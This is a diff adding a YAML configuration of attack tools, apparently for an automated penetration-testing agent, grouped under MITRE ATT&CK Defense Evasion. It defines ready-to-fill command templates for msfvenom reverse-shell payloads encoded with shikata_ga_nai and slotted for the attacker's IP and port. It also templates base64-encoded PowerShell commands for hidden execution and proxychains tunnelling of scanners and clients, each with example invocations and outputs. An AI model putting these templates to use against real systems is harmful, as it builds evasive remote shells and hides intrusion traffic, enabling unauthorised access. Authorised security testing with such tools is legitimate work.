@@ -1,0 +1,78 @@
+# Defense Evasion (TA0005): payload encoding, traffic obfuscation, low-noise
+# alternatives. From-Kali tools only - no agent-side evasion of EDR.
+
+tools:
+  - name: msfvenom_encoded_payload
+    category: exploit
+    description: Generate an x86/shikata_ga_nai-encoded reverse shell.
+    command_template: "msfvenom -p {payload} LHOST={lhost} LPORT={lport} -e x86/shikata_ga_nai -i {iterations} -f {format} -o /tmp/enc-{lport}.bin"
+    slots:
+      - name: payload
+        type: enum
+        description: msf payload identifier
+        values:
+          - "windows/shell/reverse_tcp"
+          - "windows/x64/shell/reverse_tcp"
+          - "linux/x86/shell/reverse_tcp"
+        default: "windows/x64/shell/reverse_tcp"
+      - { name: lhost, type: ip, description: attacker IP }
+      - { name: lport, type: port, description: attacker port, default: 4444 }
+      - { name: iterations, type: int, description: encoding iterations, min: 1, max: 20, default: 5 }
+      - name: format
+        type: enum
+        description: output format
+        values: [exe, elf, raw]
+        default: exe
+    runtime_cap_seconds: 120
+    output_parser_id: msfvenom
+    attack:
+      matrices: [enterprise]
+      tactics: [TA0005, TA0002]
+      techniques: [T1027, T1027.002]
+    example_invocation:
+      payload: "windows/x64/shell/reverse_tcp"
+      lhost: 10.10.14.2
+      lport: 4444
+      iterations: 5
+      format: exe
+    example_output: |
+      Found 1 compatible encoders
+      Attempting to encode payload with 5 iterations of x86/shikata_ga_nai
+      Saved as: /tmp/enc-4444.bin
+
+  - name: base64_encode_command
+    category: exploit
+    description: Base64-encode a PowerShell command for -EncodedCommand execution (UTF-16LE).
+    command_template: "echo -n {command} | iconv -t UTF-16LE | base64 -w 0"
+    slots:
+      - { name: command, type: free_string, description: PowerShell snippet to encode }
+    runtime_cap_seconds: 10
+    output_parser_id: raw
+    attack:
+      matrices: [enterprise]
+      tactics: [TA0005, TA0002]
+      techniques: [T1027.010, T1059.001]
+    example_invocation: { command: "Get-Process" }
+    example_output: |
+      RwBlAHQALQBQAHIAbwBjAGUAcwBzAA==
+
+  - name: proxychains_command
+    category: exploit
+    description: Run a command tunneled through proxychains (assumes /etc/proxychains.conf is configured).
+    command_template: "proxychains -q {tool} {args}"
+    slots:
+      - name: tool
+        type: enum
+        description: tool to tunnel
+        values: [nmap, curl, smbclient, ssh, rdesktop, ftp, telnet]
+        default: nmap
+      - { name: args, type: free_string, description: arguments forwarded to the tool }
+    runtime_cap_seconds: 600
+    output_parser_id: raw
+    attack:
+      matrices: [enterprise]
+      tactics: [TA0005, TA0011]
+      techniques: [T1090, T1572]
+    example_invocation: { tool: nmap, args: "-Pn -sT 192.168.1.10" }
+    example_output: |
+      |S-chain|-<>-127.0.0.1:1080-<><>-192.168.1.10:80-<><>-OK
